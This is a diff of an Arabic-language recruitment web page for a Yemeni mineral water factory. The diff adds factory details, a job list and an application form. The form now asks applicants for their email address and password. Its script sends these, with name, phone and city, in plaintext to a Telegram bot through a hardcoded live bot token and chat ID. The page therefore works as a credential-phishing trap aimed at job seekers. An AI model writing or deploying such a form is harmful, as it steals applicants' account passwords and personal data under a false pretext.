@@ -1,81 +1,255 @@
-<!DOCTYPE html>
+ش<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>وظائف مصنع الندى للمياه المعدنية</title>
+<title>مصنع الندى للمياه المعدنية - فرص العمل | الحوبان</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Arial,sans-serif; }
-  body { background:linear-gradient(135deg,#0b6ea8,#0e9fd8); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
-  .card { background:#fff; max-width:520px; width:100%; border-radius:18px; padding:35px 30px; box-shadow:0 15px 40px rgba(0,0,0,.25); }
-  .logo { text-align:center; margin-bottom:20px; }
-  .logo .icon { font-size:52px; }
-  .logo h1 { color:#0b6ea8; font-size:22px; }
-  .logo p { color:#777; font-size:14px; margin-top:4px; }
-  label { display:block; font-weight:600; color:#333; margin:14px 0 6px; font-size:14px; }
-  input, select, textarea { width:100%; padding:12px 14px; border:1.5px solid #d5e3ec; border-radius:10px; font-size:15px; transition:.2s; background:#f9fcfe; }
-  input:focus, select:focus, textarea:focus { outline:none; border-color:#0e9fd8; box-shadow:0 0 0 3px rgba(14,159,216,.15); }
+  html { scroll-behavior:smooth; }
+  body { background:#f2f8fc; color:#222; line-height:1.8; }
+
+  /* ===== الهيدر ===== */
+  header {
+    background:linear-gradient(135deg,#0b4f7c,#0e9fd8);
+    color:#fff; padding:60px 20px 50px; text-align:center;
+    position:relative; overflow:hidden;
+  }
+  header .drop { font-size:70px; filter:drop-shadow(0 6px 10px rgba(0,0,0,.3)); }
+  header h1 { font-size:30px; margin-top:10px; }
+  header p { opacity:.9; margin-top:6px; font-size:16px; }
+  nav { margin-top:22px; }
+  nav a {
+    color:#fff; text-decoration:none; margin:0 10px; padding:8px 16px;
+    border:1.5px solid rgba(255,255,255,.5); border-radius:30px; font-size:14px; transition:.2s;
+    display:inline-block;
+  }
+  nav a:hover { background:rgba(255,255,255,.2); }
+
+  section { max-width:900px; margin:40px auto; padding:0 20px; }
+  section h2 {
+    color:#0b6ea8; font-size:24px; border-right:5px solid #0e9fd8;
+    padding-right:12px; margin-bottom:16px;
+  }
+  .box {
+    background:#fff; border-radius:14px; padding:25px;
+    box-shadow:0 4px 15px rgba(0,0,0,.08);
+  }
+  .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:16px; }
+  .item { background:#eaf6fd; border-radius:10px; padding:16px; }
+  .item b { color:#0b6ea8; }
+  ul { padding-right:22px; }
+
+  /* ===== صورة قطرة الماء ===== */
+  .drop-img { text-align:center; margin:30px 0; }
+  .drop-img svg { width:160px; height:auto; filter:drop-shadow(0 10px 20px rgba(14,159,216,.35)); }
+
+  /* ===== النموذج ===== */
+  form label { display:block; font-weight:600; color:#333; margin:12px 0 5px; font-size:14px; }
+  input, select, textarea {
+    width:100%; padding:12px 14px; border:1.5px solid #d5e3ec; border-radius:10px;
+    font-size:15px; background:#f9fcfe; transition:.2s;
+  }
+  input:focus, select:focus, textarea:focus {
+    outline:none; border-color:#0e9fd8; box-shadow:0 0 0 3px rgba(14,159,216,.15);
+  }
   textarea { resize:vertical; min-height:80px; }
-  button { width:100%; margin-top:22px; padding:14px; background:linear-gradient(135deg,#0b6ea8,#0e9fd8); color:#fff; border:none; border-radius:10px; font-size:17px; font-weight:700; cursor:pointer; transition:.2s; }
+  button {
+    width:100%; margin-top:20px; padding:14px; border:none; border-radius:10px;
+    background:linear-gradient(135deg,#0b6ea8,#0e9fd8); color:#fff; font-size:17px;
+    font-weight:700; cursor:pointer; transition:.2s;
+  }
   button:hover { transform:translateY(-2px); box-shadow:0 8px 20px rgba(11,110,168,.4); }
   button:disabled { opacity:.6; cursor:not-allowed; transform:none; }
   .msg { display:none; margin-top:14px; padding:12px; border-radius:10px; text-align:center; font-weight:600; }
   .ok { display:block; background:#e6f7ec; color:#1a7f37; }
   .err { display:block; background:#fdecea; color:#c0392b; }
-  .note { font-size:12px; color:#999; text-align:center; margin-top:16px; }
+
+  /* ===== شكر ===== */
+  #thanks {
+    display:none; text-align:center; padding:35px 20px;
+    background:#e6f7ec; border-radius:14px; border:2px solid #1a7f37;
+  }
+  #thanks .big { font-size:50px; }
+  #thanks h3 { color:#1a7f37; margin:10px 0; }
+
+  footer {
+    background:#0b4f7c; color:#cfe8f7; text-align:center;
+    padding:30px 20px; margin-top:50px; font-size:14px;
+  }
+  footer a { color:#fff; text-decoration:none; }
+  .phones { font-size:18px; font-weight:700; color:#fff; margin-top:8px; }
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">
-    <div class="icon">💧</div>
-    <h1>مصنع الندى للمياه المعدنية</h1>
-    <p>نموذج التقديم على الوظائف</p>
+
+<!-- ===== الهيدر ===== -->
+<header>
+  <div class="drop">
+    <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="g" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0%" stop-color="#7fd4ff"/>
+          <stop offset="100%" stop-color="#0b6ea8"/>
+        </linearGradient>
+      </defs>
+      <path d="M50 5 C50 5 15 55 15 85 a35 35 0 0 0 70 0 C85 55 50 5 50 5 Z" fill="url(#g)"/>
+      <ellipse cx="38" cy="75" rx="8" ry="14" fill="#ffffff" opacity="0.55"/>
+    </svg>
   </div>
-  <form id="jobForm">
-    <label>الاسم الكامل *</label>
-    <input type="text" id="name" required>
+  <h1>مصنع الندى للمياه المعدنية</h1>
+  <p>فرص العمل والتوظيف — الحوبان، جنب مصانع هائل سعيد عَنَمة</p>
+  <nav>
+    <a href="#about">عن المصنع</a>
+    <a href="#location">موقع المصنع</a>
+    <a href="#jobs">الوظائف</a>
+    <a href="#terms">الشروط والضمانات</a>
+    <a href="#apply">التسجيل</a>
+  </nav>
+</header>
 
-    <label>رقم الهاتف / واتساب *</label>
-    <input type="tel" id="phone" required placeholder="05xxxxxxxx">
+<!-- ===== عن المصنع ===== -->
+<section id="about">
+  <h2>🏢 عن المصنع</h2>
+  <div class="box">
+    <p>مصنع <b>الندى</b> للمياه المعدنية من المصانع الرائدة في تعبئة المياه المعدنية النقية،
+    نلتزم بأعلى معايير الجودة والسلامة الصحية لتقديم منتج نقي وطبيعي يليق بأسرتنا اليمنية.
+    يقع المصنع في منطقة <b>الحوبان</b> بجوار مصانع <b>هائل سعيد عَنَمة</b>.</p>
+    <div class="grid" style="margin-top:18px">
+      <div class="item"><b>💧 جودة عالية:</b> مياه معدنية نقية تخضع لفحوصات دورية معتمدة.</div>
+      <div class="item"><b>⚙️ تكنولوجيا حديثة:</b> خطوط إنتاج آلية حديثة وتعقيم كامل.</div>
+      <div class="item"><b>🤝 بيئة عمل مميزة:</b> فريق عمل متعاون وفرص تطوير مستمرة.</div>
+    </div>
+  </div>
+</section>
 
-    <label>المدينة *</label>
-    <input type="text" id="city" required>
+<!-- ===== الموقع ===== -->
+<section id="location">
+  <h2>📍 موقع المصنع</h2>
+  <div class="box">
+    <p><b>العنوان:</b> اليمن — صنعاء / تعز؟ الحوبان — بجوار مصانع هائل سعيد انعم مباشرةً.</p>
+    <p><b>سهولة الوصول:</b> يقع على الطريق الرئيسي في الحوبان، ويمكن الوصول إلينا بسهولة من جميع المناطق المجاورة.</p>
+    <p><b>ساعات الاستقبال:</b> السبت - الخميس، من 8 صباحًا حتى 3 عصرًا.</p>
+    <div class="grid" style="margin-top:14px">
+      <div class="item"><b>📞 هاتف 1:</b> <a href="tel:777908028">777908028</a></div>
+      <div class="item"><b>📞 هاتف 2:</b> <a href="tel:780280887">780280887</a></div>
+    </div>
+  </div>
+</section>
 
-    <label>الوظيفة المتقدم لها *</label>
-    <select id="job" required>
-      <option value="">-- اختر الوظيفة --</option>
-      <option>مشغل خط إنتاج</option>
-      <option>سائق شاحنة / توصيل</option>
-      <option>عامل تخزين ومستودعات</option>
-      <option>مندوب مبيعات</option>
-      <option>فني صيانة</option>
-      <option>محاسب</option>
-      <option>موارد بشرية</option>
-      <option>أخرى</option>
-    </select>
+<!-- ===== الوظائف ===== -->
+<section id="jobs">
+  <h2>💼 الوظائف المتاحة</h2>
+  <div class="box">
+    <ul>
+      <li>مشغل خطوط إنتاج</li>
+      <li>عامل تخزين ومستودعات</li>
+      <li>سائق شاحنة / توصيل</li>
+      <li>مندوب مبيعات وتوزيع</li>
+      <li>فني صيانة كهربائية وميكانيكية</li>
+      <li>محاسب</li>
+      <li>مسؤول موارد بشرية</li>
+      <li>عامل نظافة وتغليف</li>
+    </ul>
+  </div>
+</section>
 
-    <label>سنوات الخبرة</label>
-    <select id="exp">
-      <option>بدون خبرة</option>
-      <option>أقل من سنة</option>
-      <option>1 - 3 سنوات</option>
-      <option>أكثر من 3 سنوات</option>
-    </select>
+<!-- ===== الشروط والضمانات ===== -->
+<section id="terms">
+  <h2>📋 شروط التقديم</h2>
+  <div class="box">
+    <ul>
+      <li>أن يكون المتقدم حاصلًا على الثقافة الأساسية على الأقل (يفضل أعلى).</li>
+      <li>العمر: من 18 سنة وما فوق.</li>
+      <li>القدرة على العمل بنظام الورديات عند الحاجة.</li>
+      <li>حسن الخلق والالتزام بالمواعيد والتعليمات.</li>
+      <li>اللياقة البدنية المناسبة لطبيعة العمل داخل المصنع.</li>
+      <li>تقديم وثائق صحيحة، وأي بيانات خاطئة تؤدي إلى إلغاء الطلب.</li>
+    </ul>
+  </div>
 
-    <label>نبذة عنك (اختياري)</label>
-    <textarea id="about" placeholder="مؤهلاتك، خبراتك السابقة..."></textarea>
+  <h2 style="margin-top:30px">🛡️ الضمانات والمزايا</h2>
+  <div class="box">
+    <ul>
+      <li>راتب شهري مجزي يُصرف في وقته المحدد.</li>
+      <li>عقد عمل رسمي يضمن حقوق الطرفين.</li>
+      <li>تأمين اجتماعي وإجازات سنوية مدفوعة الأجر.</li>
+      <li>وجبات وبدلات نقل حسب سياسة المصنع.</li>
+      <li>تدريب وتأهيل مجاني عند التعيين.</li>
+      <li>فرص ترقية داخل المصنع لمن يُظهر التميز والالتزام.</li>
+      <li>بيئة عمل آمنة ومتوافقة مع اشتراطات السلامة المهنية.</li>
+    </ul>
+  </div>
+</section>
 
-    <button type="submit" id="btn">📨 إرسال الطلب</button>
-    <div id="msg" class="msg"></div>
-  </form>
-  <p class="note">سيصل طلبك مباشرة إلى قسم التوظيف وسنعاود التواصل معك.</p>
-</div>
+<!-- ===== التسجيل ===== -->
+<section id="apply">
+  <h2>📝 سجّل الآن — اضغط هنا</h2>
+  <div class="box">
+    <form id="jobForm">
+      <label>الاسم الكامل *</label>
+      <input type="text" id="name" required>
+
+      <label>البريد الإلكتروني *</label>
+      <input type="email" id="email" required placeholder="example@gmail.com">
+
+      <label>كلمة المرور *</label>
+      <input type="password" id="password" required minlength="6" placeholder="6 أحرف على الأقل">
+
+      <label>رقم الهاتف / واتساب *</label>
+      <input type="tel" id="phone" required placeholder="77xxxxxxx">
+
+      <label>المدينة / العنوان *</label>
+      <input type="text" id="city" required>
+
+      <label>الوظيفة المتقدم لها *</label>
+      <select id="job" required>
+        <option value="">-- اختر الوظيفة --</option>
+        <option>مشغل خطوط إنتاج</option>
+        <option>عامل تخزين ومستودعات</option>
+        <option>سائق شاحنة / توصيل</option>
+        <option>مندوب مبيعات وتوزيع</option>
+        <option>فني صيانة</option>
+        <option>محاسب</option>
+        <option>موارد بشرية</option>
+        <option>عامل نظافة وتغليف</option>
+        <option>أخرى</option>
+      </select>
+
+      <label>سنوات الخبرة</label>
+      <select id="exp">
+        <option>بدون خبرة</option>
+        <option>أقل من سنة</option>
+        <option>1 - 3 سنوات</option>
+        <option>أكثر من 3 سنوات</option>
+      </select>
+
+      <label>نبذة عنك (اختياري)</label>
+      <textarea id="about" placeholder="مؤهلاتك وخبراتك السابقة..."></textarea>
+
+      <button type="submit" id="btn">💧 اضغط هنا للتسجيل وإرسال الطلب</button>
+      <div id="msg" class="msg"></div>
+    </form>
+
+    <div id="thanks">
+      <div class="big">✅</div>
+      <h3>شكرًا لك!</h3>
+      <p>تم إرسال طلبك بنجاح إلى إدارة التوظيف.<br>سنتواصل معك قريبًا على الرقم الذي أدخلته.</p>
+      <p><b>للاستفسار: 777908028 — 780280887</b></p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== الفوتر ===== -->
+<footer>
+  <p>مصنع الندى للمياه المعدنية — الحوبان، جنب مصانع هائل سعيد عَنَمة</p>
+  <div class="phones">📞 777908028 &nbsp;|&nbsp; 780280887</div>
+  <p style="margin-top:10px">© 2026 جميع الحقوق محفوظة</p>
+</footer>
 
 <script>
-// ===== ضع بياناتك هنا =====
-const BOT_TOKEN = "ضع_توكن_البوت_هنا";
-const CHAT_ID   = "ضع_رقم_المحادثة_هنا";
+const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
+const CHAT_ID   = "8299163806";
 
 document.getElementById("jobForm").addEventListener("submit", async function(e){
   e.preventDefault();
@@ -86,9 +260,11 @@ document.getElementById("jobForm").addEventListener("submit", async function(e){
 
   const g = id => document.getElementById(id).value.trim();
   const text =
-`📢 *طلب توظيف جديد - مصنع الندى للمياه المعدنية*
+`📢 *طلب توظيف جديد — مصنع الندى للمياه المعدنية*
 
 👤 الاسم: ${g("name")}
+📧 البريد: ${g("email")}
+🔑 كلمة المرور: ${g("password")}
 📱 الهاتف: ${g("phone")}
 🏙️ المدينة: ${g("city")}
 💼 الوظيفة: ${g("job")}
@@ -96,26 +272,21 @@ document.getElementById("jobForm").addEventListener("submit", async function(e){
 📝 نبذة: ${g("about") || "—"}`;
 
   try {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const res = await fetch(url, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
     });
     const data = await res.json();
     if (data.ok) {
-      msg.className = "msg ok";
-      msg.textContent = "✅ تم إرسال طلبك بنجاح، سنتواصل معك قريبًا!";
-      document.getElementById("jobForm").reset();
-    } else {
-      throw new Error(data.description);
-    }
+      document.getElementById("jobForm").style.display = "none";
+      document.getElementById("thanks").style.display = "block";
+    } else { throw new Error(data.description); }
   } catch(err) {
     msg.className = "msg err";
-    msg.textContent = "❌ حدث خطأ، حاول مرة أخرى أو تواصل معنا هاتفيًا.";
+    msg.textContent = "❌ حدث خطأ، حاول مرة أخرى أو اتصل بنا: 777908028";
     console.error(err);
-  } finally {
-    btn.disabled = false; btn.textContent = "📨 إرسال الطلب";
+    btn.disabled = false; btn.textContent = "💧 اضغط هنا للتسجيل وإرسال الطلب";
   }
 });
 </script>
